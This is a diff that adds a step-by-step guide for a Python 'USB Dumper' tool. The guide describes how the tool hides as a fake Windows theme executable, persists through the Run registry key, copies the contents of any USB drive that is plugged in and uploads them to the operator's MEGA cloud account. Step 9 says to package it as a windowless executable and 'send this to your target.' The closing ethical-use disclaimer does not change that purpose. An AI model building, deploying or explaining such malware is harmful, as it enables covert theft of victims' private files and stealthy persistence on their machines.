@@ -1,0 +1,147 @@
+How to Run the USB Dumper Script
+
+This guide will walk you through running the USB Dumper script step by step. The script monitors USB drives, copies their contents, zips them, and uploads them to your MEGA cloud storage. It also ensures the script runs automatically every time your computer starts.
+
+
+
+Step 1: Install Python
+----------------------
+
+1. Download Python:
+   - Go to [python.org](https://www.python.org/downloads/).
+   - Download the latest version of Python (3.x).
+   
+2. Install Python:
+   - Run the installer.
+   - Make sure to check the box that says "Add Python to PATH" during installation.
+   - Click Install Now.
+
+
+
+Step 2: Install Required Libraries
+-----------------------------------
+
+The script uses some Python libraries that need to be installed. Open a terminal or command prompt and run the following commands:
+
+
+pip install mega.py
+pip install shutil
+pip install zipfile
+pip install subprocess
+pip install sys
+
+
+
+Step 3: Set Up Your MEGA Credentials
+------------------------------------
+1. Open the script in a text editor (e.g., Notepad, VS Code, or any code editor).
+2. Find these lines near the top of the script:
+
+   
+   MEGA_EMAIL = "email@email.com"   Replace with your MEGA email
+   MEGA_PASSWORD = "password123"   Replace with your MEGA password
+   
+
+3. Replace the email and password with your own MEGA account credentials.
+
+
+Step 4: Save the Script
+-----------------------
+1. Save the script as `usb_dumper.py` on your computer (e.g., on your Desktop or in a folder).
+
+
+Step 5: Run the Script
+----------------------
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you saved the script. For example, if it's on your Desktop, run:
+
+   cd Desktop
+   
+
+3. Run the script:
+
+   
+   python usb_dumper.py
+   
+
+
+Step 6: What the Script Does
+----------------------------
+1. Persistence:
+   - The script will copy itself to a hidden location (`AppData\Microsoft\Windows\Themes\svc_template1.exe`) and add itself to the Windows startup registry. This ensures it runs automatically every time your computer starts.
+
+2. USB Monitoring:
+   - The script will continuously monitor all USB drives (except `C:\` and `D:\`).
+   - If it detects a USB drive, it will check if the contents have changed since the last time it ran.
+
+3. Copy and Upload:
+   - If changes are detected, the script will:
+     - Copy the USB contents to a local folder (`AppData\Microsoft\Windows\Themes\Themes\IntelThemes`).
+     - Zip the folder.
+     - Upload the zip file to your MEGA cloud storage in the folder `usb_captures`.
+
+4. Repeat:
+   - The script will keep running in the background, checking for USB drives every 10 seconds.
+
+---
+
+Step 7: Stop the Script
+----------------------
+1. To stop the script, you need to:
+   - Remove it from the Windows startup registry.
+   - Delete the copied executable (`svc_template1.exe`).
+
+2. Remove from Startup:
+   - Open a command prompt and run:
+
+     reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc_template /f
+     
+
+3. Delete the Executable:
+    Navigate to `AppData\Microsoft\Windows\Themes` and delete the file `svc_template1.exe`.
+
+
+Step 8: Check Your MEGA Account
+-------------------------------
+
+1. Log in to your MEGA account.
+2. Navigate to the `usb_captures` folder.
+3. You should see zip files containing the contents of any USB drives that were connected to your computer.
+
+
+ Troubleshooting
+ ----------------
+
+1. Script Doesn’t Run:
+   - Make sure Python is installed and added to PATH.
+   - Ensure all required libraries are installed (`pip install mega.py`, etc.).
+   - Double-check your MEGA credentials.
+
+2. Upload Fails:
+   - Check your internet connection.
+   - Ensure your MEGA account has enough storage space.
+
+3. USB Not Detected:
+   - Make sure the USB drive is properly connected.
+   - Check if the drive letter is excluded in the `EXCLUDED_DRIVES` list in the script.
+
+Step 9: Converting script into a binary executable
+--------------------------------------------------
+
+Now here comes the main part, converting the python script into executable and send it to target.
+	1. Save the folder on desktop and extract it
+	2. open terminal and type following commands
+		cd Desktop
+		cd Usb_Dumper
+		pyinstaller usb_dumper.py --onefile --noconsole --icon icon.ico
+	3. This will make an executable file in Destop/Usb_Dumper/dist/usb_dumper.exe
+	4. Send this to your target and enjoy
+
+
+ Important Notes
+- Ethical Use: Only use this script on devices you own or have explicit permission to monitor. Unauthorized use may violate privacy laws.
+- Security: Avoid sharing your MEGA credentials or the script with others.
+- Persistence: The script is designed to run automatically at startup. If you don’t want this behavior, remove the `become_good()` function call in the script.
+
+
+
